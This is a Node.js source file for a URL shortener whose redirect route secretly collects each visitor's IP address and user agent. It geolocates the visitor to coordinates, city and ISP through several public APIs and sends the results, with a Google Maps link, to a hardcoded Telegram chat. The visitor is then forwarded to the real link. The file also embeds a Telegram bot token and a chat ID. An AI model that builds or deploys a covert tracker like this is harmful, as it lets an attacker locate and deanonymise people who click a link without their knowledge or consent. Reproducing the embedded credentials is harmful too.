const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getLocation(ip) {
  console.log(`[Geo] Getting location for IP: ${ip}`);

  // الطريقة 1: MaxMind GeoIP2
  try {
    const res = await axios.get(`https://geoip.maxmind.com/geoip/v2.1/city/${ip}?pretty=true`, { timeout: 2000 });
    if (res.data) {
      console.log('[Geo] MaxMind success');
      return {
        country: res.data.country?.names?.ar || res.data.country?.iso_code,
        city: res.data.city?.names?.ar,
        latitude: res.data.location?.latitude,
        longitude: res.data.location?.longitude,
        isp: 'N/A',
        source: 'MaxMind'
      };
    }
  } catch (e) { console.log('[Geo] MaxMind fail:', e.message); }

  // الطريقة 2: Freegeoip.net
  try {
    const res = await axios.get(`https://freegeoip.app/json/${ip}`, { timeout: 2000 });
    if (res.data && res.data.latitude) {
      console.log('[Geo] Freegeoip success');
      return {
        country: res.data.country_name,
        city: res.data.city,
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        isp: 'N/A',
        source: 'freegeoip'
      };
    }
  } catch (e) { console.log('[Geo] Freegeoip fail:', e.message); }

  // الطريقة 3: DigitalOcean
  try {
    const res = await axios.get(`https://api.digitalocean.com/metadata/v1/public-ipv4`, { timeout: 2000 });
    console.log('[Geo] DigitalOcean response:', res.data);
  } catch (e) { console.log('[Geo] DigitalOcean fail'); }

  // الطريقة 4: ipapi.co (بدون key)
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
    if (res.data && res.data.city) {
      console.log('[Geo] ipapi.co success');
      return {
        country: res.data.country_name,
        city: res.data.city,
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        isp: res.data.org,
        source: 'ipapi.co'
      };
    }
  } catch (e) { console.log('[Geo] ipapi.co fail:', e.message); }

  // الطريقة 5: ip-api.com
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp`, { timeout: 2000 });
    console.log('[Geo] ip-api response:', JSON.stringify(res.data));
    if (res.data && res.data.status === 'success' && res.data.lat && res.data.lon) {
      console.log('[Geo] ip-api success');
      return {
        country: res.data.country,
        city: res.data.city,
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp,
        source: 'ip-api'
      };
    }
  } catch (e) { console.log('[Geo] ip-api fail:', e.message); }

  console.log('[Geo] All APIs failed');
  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
  try {
    console.log(`[Telegram] Processing IP: ${ip}`);
    const location = await getLocation(ip);

    console.log(`[Telegram] Location result:`, location);

    let msg = `
🔗 رابط جديد!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
`;

    if (location && location.latitude && location.longitude) {
      msg += `
📍 الدولة: ${location.country || 'N/A'}
🏙️ المدينة: ${location.city || 'N/A'}
🌍 ISP: ${location.isp || 'N/A'}
📊 Latitude: ${location.latitude}
📊 Longitude: ${location.longitude}
🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
📡 Source: ${location.source}
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم التحديد
`;
    }

    msg += `
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
    console.log('[Telegram] Message sent');
  } catch (err) {
    console.error('[Telegram] Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  console.log(`[Route] Code: ${code}, IP: ${ip}`);

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent);
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));